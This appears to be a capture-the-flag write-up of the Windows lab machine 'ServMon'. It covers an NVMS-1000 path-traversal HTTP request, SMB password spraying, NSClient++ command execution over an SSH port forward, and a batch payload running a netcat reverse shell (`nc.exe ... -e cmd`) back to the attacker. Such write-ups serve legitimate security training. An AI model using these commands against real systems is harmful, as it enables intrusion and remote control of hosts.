#Windows #FTP #Anonymous #PathTraversal #NVMS1000 #PasswordSpray #SSH #NSClient #PortForwarding #Unstable

## Overview

ServMon is an easy Windows box where anonymous FTP access leads to a note pointing at a sensitive file location, a path traversal in NVMS-1000 retrieves that password list, and password spraying over SSH yields a shell. Privilege escalation goes through NSClient++, which only accepts connections from localhost, requiring an SSH port forward before the web UI is usable for SYSTEM command execution. The NSClient privesc is notably unstable.

> **Note:** the notes flag the NSClient++ privilege escalation as unstable, referencing 0xdf's writeup for timing details. This writeup documents the technique as recorded; results may require multiple attempts.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH for_Windows_8.0
80/tcp    open  http
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
```

Port 80 redirects to an NVMS-1000 login page. Port 8443 serves NSClient++.

### FTP, Anonymous Access

FTP allows anonymous login and contains user directories for Nathan and Nadine. Two text files are recoverable:

```sh
cat "Notes to do.txt"
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

```sh
cat Confidential.txt
Nathan,
I left your Passwords.txt file on your Desktop. Please remove this once you have
edited it yourself and place it back into the secure folder.
Regards
Nadine
```

The note tells us exactly where to look: `C:\Users\Nathan\Desktop\Passwords.txt`.

## Foothold

### NVMS-1000 Path Traversal (CVE / EDB-48311)

NVMS-1000 has a directory traversal vulnerability. Firefox blocks the traversal, but routing the request through Burp works:

```http
GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
Host: 10.129.227.77
Cookie: dataPort=6063
```

The response returns the passwords file:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

> **Why path traversal hits arbitrary files:** NVMS-1000 constructs a filesystem path from the URL without sanitising `../` sequences, so the traversal walks up to drive root and then back down to any readable file. The `Cookie: dataPort=6063` header is required for the request to be processed.

### Password Spray

Build a user list from the FTP directory names and spray the recovered passwords over SMB:

```sh
nxc smb 10.129.227.77 -u users.txt -p pass.txt --continue-on-success
```

One hit:

```
ServMon\nadine:L1k3B1gBut7s@W0rk
```

SSH directly:

```
Microsoft Windows [Version 10.0.17763.864]
nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```

User flag obtained from `C:\Users\Nadine\Desktop\user.txt`.

## Privilege Escalation

### NSClient++, Localhost-Only Web UI + Command Execution

NSClient++ has a CLI helper to reveal the stored web password:

```
PS C:\Program Files\NSClient++> .\nscp.exe web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

The password is also in the `.ini` config file. However, the ini restricts access to localhost:

```
; Undocumented key
allowed hosts = 127.0.0.1
```

Forward the port over the existing SSH session to access NSClient++ as localhost:

```sh
ssh nadine@10.129.227.77 -L 8443:127.0.0.1:8443
```

Browse to `https://127.0.0.1:8443` and log in with the recovered password.

> **Why the port forward matters:** the `allowed hosts` directive causes NSClient++ to reject any HTTP request that doesn't originate from 127.0.0.1. By forwarding over SSH, our browser's connections arrive at the server's loopback interface, satisfying that check.

Create a batch payload on disk:

```sh
\programdata\nc.exe 10.10.14.92 443 -e cmd
```

Add the script via Settings > External Scripts > Scripts > +Add New, setting the value to `C:\\programdata\\shell.bat`. Then schedule it via Scheduler > Schedules > +Add New (value: `10s`, re-open and set to `df` to trigger).

A SYSTEM shell is received on the listener. The timing is unreliable, multiple attempts may be needed.

## Root

Box rooted as `nt authority\system`.

## Takeaways

- **Anonymous FTP is often the entry point on Windows boxes.** Notes left between users frequently describe exactly where sensitive files live.
- **Path traversal + a known file location = credential recovery.** The FTP note told us the target path; the traversal retrieved it.
- **Password spraying after a credential dump is fast and low-noise.** Seven passwords across three users requires only one spray run.
- **localhost-only services are bypassed with SSH port forwarding.** If you have shell access, any service restricted to 127.0.0.1 becomes accessible.
